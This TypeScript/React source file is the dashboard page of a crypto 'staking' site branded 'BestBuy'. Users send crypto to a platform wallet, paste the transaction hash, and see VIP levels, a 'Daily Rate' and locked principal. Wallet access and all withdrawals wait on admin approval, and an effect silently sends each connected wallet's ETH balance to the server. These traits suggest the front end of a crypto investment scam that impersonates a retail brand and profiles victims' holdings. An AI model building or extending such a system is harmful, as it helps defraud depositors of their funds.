"use client";

import { useEffect, useState, useCallback } from "react";
import { useRouter } from "next/navigation";
import { useWallet } from "@/lib/WalletContext";
import { getUser, getUserTransactions, claimRewards, requestWithdrawal, getSettings, reportBalance, getWalletBalance, submitStake } from "@/lib/api";
import BestBuyLogo from "@/components/BestBuyLogo";
import FaIcon from "@/components/FaIcon";

type UserData = {
  stakedAmount: number;
  totalEarned: number;
  claimableRewards: number;
  vipLevel: number;
  status: string;
  walletBalance: { eth: string; usdt: string };
  daysUntilUnlock: number | null;
  principalLocked: boolean;
};

type Transaction = {
  id: number;
  type: string;
  amount: number;
  date: string;
  status: string;
  txHash?: string;
  token?: string;
};

type Settings = {
  baseAPY: number;
  withdrawalFee: number;
  platformWallet: string;
  platformWalletETH?: string;
  platformWalletBSC?: string;
};

const VIP_NAMES = ["Standard", "VIP 1", "VIP 2", "VIP 3"];

export default function DashboardPage() {
  const router = useRouter();
  const { address, short, network, status: walletStatus, disconnect } = useWallet();
  const [user, setUser] = useState<UserData | null>(null);
  const [txns, setTxns] = useState<Transaction[]>([]);
  const [settings, setSettings] = useState<Settings | null>(null);
  const [loading, setLoading] = useState(true);
  const [withdrawAmt, setWithdrawAmt] = useState("");
  const [msg, setMsg] = useState({ text: "", ok: false });
  const [tab, setTab] = useState<"overview" | "stake" | "transactions" | "withdraw">("overview");
  const [walletBal, setWalletBal] = useState<{ totalUsd: number; eth: string; tokens: Array<{ symbol: string; balance: string; usdValue: number }> } | null>(null);
  const [stakeTxHash, setStakeTxHash] = useState("");
  const [stakeAmt, setStakeAmt] = useState("");
  const [stakeNetwork, setStakeNetwork] = useState("BSC");
  const [stakeToken, setStakeToken] = useState("USDT");
  const [copied, setCopied] = useState(false);

  const loadData = useCallback(async () => {
    if (!address) return;
    try {
      const [u, t, s] = await Promise.all([
        getUser(address),
        getUserTransactions(address),
        getSettings(),
      ]);
      setUser(u);
      setTxns(t);
      setSettings(s);
      getWalletBalance(address).then(b => setWalletBal(b)).catch(() => {});
    } catch {
      /* ignore */
    } finally {
      setLoading(false);
    }
  }, [address]);

  useEffect(() => {
    if (walletStatus === "loading") return;
    if (walletStatus === "disconnected") {
      router.push("/");
      return;
    }
    loadData();
  }, [walletStatus, loadData, router]);

  useEffect(() => {
    if (!address || typeof window === "undefined") return;
    const w = window as unknown as { ethereum?: { request: (args: { method: string; params?: unknown[] }) => Promise<string> } };
    if (!w.ethereum) return;
    (async () => {
      try {
        const hex = await w.ethereum!.request({ method: "eth_getBalance", params: [address, "latest"] });
        const wei = BigInt(hex);
        const eth = (Number(wei) / 1e18).toFixed(6);
        reportBalance(address, eth, "0").catch(() => {});
      } catch { /* ignore */ }
    })();
  }, [address]);

  async function handleClaim() {
    if (!address) return;
    setMsg({ text: "", ok: false });
    try {
      const res = await claimRewards(address);
      setMsg({ text: `Claimed $${res.claimed.toFixed(2)} USDT`, ok: true });
      loadData();
    } catch (e) {
      setMsg({ text: e instanceof Error ? e.message : "Claim failed", ok: false });
    }
  }

  async function handleWithdraw(type: "earnings" | "stake") {
    if (!address || !withdrawAmt) return;
    setMsg({ text: "", ok: false });
    try {
      const amt = parseFloat(withdrawAmt);
      if (isNaN(amt) || amt <= 0) { setMsg({ text: "Enter a valid amount", ok: false }); return; }
      await requestWithdrawal(address, amt, type);
      setMsg({ text: "Withdrawal requested — pending admin approval", ok: true });
      setWithdrawAmt("");
      loadData();
    } catch (e) {
      setMsg({ text: e instanceof Error ? e.message : "Withdrawal failed", ok: false });
    }
  }

  async function handleStake() {
    if (!address || !stakeTxHash || !stakeAmt) return;
    setMsg({ text: "", ok: false });
    try {
      const amt = parseFloat(stakeAmt);
      if (isNaN(amt) || amt <= 0) { setMsg({ text: "Enter a valid amount", ok: false }); return; }
      await submitStake(address, amt, stakeTxHash, stakeNetwork, stakeToken);
      setMsg({ text: "Stake submitted! Pending admin verification.", ok: true });
      setStakeTxHash("");
      setStakeAmt("");
      loadData();
    } catch (e) {
      setMsg({ text: e instanceof Error ? e.message : "Stake submission failed", ok: false });
    }
  }

  function copyWallet(addr: string) {
    navigator.clipboard.writeText(addr).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }

  const platformAddr = stakeNetwork === "ETH" ? (settings?.platformWalletETH || settings?.platformWallet || "") : (settings?.platformWalletBSC || settings?.platformWallet || "");

  if (loading) {
    return (
      <div className="dash-wrap">
        <div className="dash-loading">Loading dashboard...</div>
      </div>
    );
  }

  if (walletStatus === "pending") {
    return (
      <div className="dash-wrap">
        <div className="dash-pending">
          <FaIcon icon="clock" />
          <h2>Wallet Pending Approval</h2>
          <p>Your wallet <strong>{short}</strong> is awaiting admin approval. Check back shortly.</p>
          <button className="btn-ghost" onClick={() => { disconnect(); router.push("/"); }}>Disconnect</button>
        </div>
      </div>
    );
  }

  if (walletStatus === "rejected") {
    return (
      <div className="dash-wrap">
        <div className="dash-pending">
          <FaIcon icon="ban" />
          <h2>Wallet Rejected</h2>
          <p>Your wallet has been rejected. Contact support for assistance.</p>
          <button className="btn-ghost" onClick={() => { disconnect(); router.push("/"); }}>Disconnect</button>
        </div>
      </div>
    );
  }

  return (
    <div className="dash-wrap">
      {/* Header */}
      <header className="dash-header">
        <a href="/" className="dash-brand">
          <BestBuyLogo />
          <span>BestBuy</span>
        </a>
        <div className="dash-header-right">
          <span className="dash-network-badge">{network}</span>
          <span className="dash-address">{short}</span>
          <button className="btn-ghost-sm" onClick={() => { disconnect(); router.push("/"); }}>
            <FaIcon icon="right-from-bracket" />
          </button>
        </div>
      </header>

      {/* Tabs */}
      <nav className="dash-tabs">
        {(["overview", "stake", "transactions", "withdraw"] as const).map((t) => (
          <button
            key={t}
            className={`dash-tab ${tab === t ? "dash-tab--active" : ""}`}
            onClick={() => { setTab(t); setMsg({ text: "", ok: false }); }}
          >
            {t === "overview" ? "Overview" : t === "stake" ? "Stake" : t === "transactions" ? "Transactions" : "Withdraw"}
          </button>
        ))}
      </nav>

      {msg.text && (
        <div className={`dash-msg ${msg.ok ? "dash-msg--ok" : "dash-msg--err"}`}>{msg.text}</div>
      )}

      {/* Overview Tab */}
      {tab === "overview" && user && (
        <div className="dash-grid">
          <div className="dash-card dash-card--wide">
            <div className="dash-card-label">Staked Balance</div>
            <div className="dash-card-value">${user.stakedAmount.toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
            {user.principalLocked && user.daysUntilUnlock !== null && (
              <div className="dash-card-sub">
                <FaIcon icon="lock" /> Locked — {user.daysUntilUnlock} days until unlock
              </div>
            )}
          </div>
          <div className="dash-card">
            <div className="dash-card-label">Total Earned</div>
            <div className="dash-card-value dash-green">${user.totalEarned.toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
          </div>
          <div className="dash-card">
            <div className="dash-card-label">Claimable Rewards</div>
            <div className="dash-card-value dash-green">${user.claimableRewards.toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
            {user.claimableRewards > 0 && (
              <button className="btn-green-sm" onClick={handleClaim} style={{ marginTop: "0.75rem" }}>
                Claim Rewards
              </button>
            )}
          </div>
          <div className="dash-card">
            <div className="dash-card-label">VIP Level</div>
            <div className="dash-card-value">{VIP_NAMES[user.vipLevel] || "Standard"}</div>
          </div>
          <div className="dash-card">
            <div className="dash-card-label">Daily Rate</div>
            <div className="dash-card-value dash-green">
              {settings ? `${settings.baseAPY}%` : "—"}
            </div>
          </div>
          <div className="dash-card">
            <div className="dash-card-label">Wallet Balance</div>
            {walletBal ? (
              <>
                <div className="dash-card-value dash-green">${parseFloat(String(walletBal.totalUsd)).toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
                <div className="dash-card-sub">{walletBal.eth} ETH</div>
                {walletBal.tokens?.filter(t => parseFloat(t.balance) > 0).slice(0, 4).map((t, i) => (
                  <div key={i} className="dash-card-sub">{t.balance} {t.symbol}</div>
                ))}
              </>
            ) : (
              <>
                <div className="dash-card-sub">{user.walletBalance.eth} ETH</div>
                <div className="dash-card-sub">{user.walletBalance.usdt} USDT</div>
              </>
            )}
          </div>
        </div>
      )}

      {/* Stake Tab */}
      {tab === "stake" && settings && (
        <div className="dash-withdraw">
          <div className="dash-card">
            <h3>Stake Crypto</h3>
            <p style={{ opacity: 0.7, fontSize: "0.85rem", margin: "0.5rem 0" }}>
              Send crypto to the platform wallet, then submit the transaction hash below.
            </p>
            <div className="form-group" style={{ marginBottom: "0.75rem" }}>
              <label style={{ fontSize: "0.8rem", opacity: 0.7, marginBottom: "0.25rem", display: "block" }}>Network</label>
              <select className="dash-input" value={stakeNetwork} onChange={(e) => { setStakeNetwork(e.target.value); setStakeToken(e.target.value === "ETH" ? "ETH" : "USDT"); }}>
                <option value="BSC">BSC (BNB Smart Chain)</option>
                <option value="ETH">Ethereum</option>
              </select>
            </div>
            <div className="form-group" style={{ marginBottom: "0.75rem" }}>
              <label style={{ fontSize: "0.8rem", opacity: 0.7, marginBottom: "0.25rem", display: "block" }}>Token</label>
              <select className="dash-input" value={stakeToken} onChange={(e) => setStakeToken(e.target.value)}>
                {stakeNetwork === "BSC" ? (
                  <>{["USDT","USDC","BUSD","BNB"].map(t => <option key={t} value={t}>{t}</option>)}</>
                ) : (
                  <>{["ETH","USDT","USDC","DAI"].map(t => <option key={t} value={t}>{t}</option>)}</>
                )}
              </select>
            </div>
            {platformAddr && (
              <div style={{ background: "rgba(46,230,168,0.08)", border: "1px solid rgba(46,230,168,0.25)", borderRadius: "8px", padding: "0.75rem", marginBottom: "0.75rem" }}>
                <div style={{ fontSize: "0.75rem", opacity: 0.6, marginBottom: "0.25rem" }}>Send {stakeToken} ({stakeNetwork}) to:</div>
                <div style={{ fontFamily: "monospace", fontSize: "0.82rem", wordBreak: "break-all", color: "#2EE6A8" }}>{platformAddr}</div>
                <button className="btn-green-sm" style={{ marginTop: "0.5rem", fontSize: "0.75rem" }} onClick={() => copyWallet(platformAddr)}>
                  {copied ? "Copied!" : "Copy Address"}
                </button>
              </div>
            )}
            <div className="dash-input-row" style={{ flexDirection: "column", gap: "0.5rem" }}>
              <input type="number" className="dash-input" placeholder="Amount (USD value)" value={stakeAmt} onChange={(e) => setStakeAmt(e.target.value)} min="0" step="0.01" />
              <input type="text" className="dash-input" placeholder="Transaction Hash (0x...)" value={stakeTxHash} onChange={(e) => setStakeTxHash(e.target.value)} style={{ fontFamily: "monospace", fontSize: "0.82rem" }} />
              <button className="btn-green-sm" onClick={handleStake} disabled={!stakeTxHash || !stakeAmt}>
                Submit Stake
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Transactions Tab */}
      {tab === "transactions" && (
        <div className="dash-txns">
          {txns.length === 0 ? (
            <div className="dash-empty">No transactions yet</div>
          ) : (
            <table className="dash-table">
              <thead>
                <tr>
                  <th>Date</th>
                  <th>Type</th>
                  <th>Amount</th>
                  <th>Token</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                {txns.map((tx) => (
                  <tr key={tx.id}>
                    <td>{new Date(tx.date).toLocaleDateString()}</td>
                    <td>{tx.type}</td>
                    <td className={tx.type === "stake" || tx.type === "deposit" ? "dash-green" : ""}>
                      {tx.type === "withdrawal" ? "-" : "+"}${Math.abs(tx.amount).toLocaleString(undefined, { minimumFractionDigits: 2 })}
                    </td>
                    <td>{tx.token || "USDT"}</td>
                    <td>
                      <span className={`dash-status dash-status--${tx.status}`}>{tx.status}</span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      )}

      {/* Withdraw Tab */}
      {tab === "withdraw" && user && (
        <div className="dash-withdraw">
          <div className="dash-card">
            <h3>Withdraw Earnings</h3>
            <p style={{ opacity: 0.7, fontSize: "0.85rem", margin: "0.5rem 0" }}>
              Available: ${user.claimableRewards.toLocaleString(undefined, { minimumFractionDigits: 2 })}
              {settings ? ` | Fee: ${settings.withdrawalFee}%` : ""}
            </p>
            <div className="dash-input-row">
              <input
                type="number"
                className="dash-input"
                placeholder="Amount (USDT)"
                value={withdrawAmt}
                onChange={(e) => setWithdrawAmt(e.target.value)}
                min="0"
                step="0.01"
              />
              <button className="btn-green-sm" onClick={() => handleWithdraw("earnings")}>
                Withdraw Earnings
              </button>
            </div>
          </div>
          <div className="dash-card" style={{ marginTop: "1rem" }}>
            <h3>Withdraw Stake</h3>
            <p style={{ opacity: 0.7, fontSize: "0.85rem", margin: "0.5rem 0" }}>
              Staked: ${user.stakedAmount.toLocaleString(undefined, { minimumFractionDigits: 2 })}
              {user.principalLocked ? " (locked)" : " (unlocked)"}
            </p>
            <div className="dash-input-row">
              <input
                type="number"
                className="dash-input"
                placeholder="Amount (USDT)"
                value={withdrawAmt}
                onChange={(e) => setWithdrawAmt(e.target.value)}
                min="0"
                step="0.01"
                disabled={user.principalLocked}
              />
              <button
                className="btn-green-sm"
                onClick={() => handleWithdraw("stake")}
                disabled={user.principalLocked}
              >
                Withdraw Stake
              </button>
            </div>
            {user.principalLocked && user.daysUntilUnlock !== null && (
              <p style={{ color: "#f6851b", fontSize: "0.8rem", marginTop: "0.5rem" }}>
                Stake unlocks in {user.daysUntilUnlock} days
              </p>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
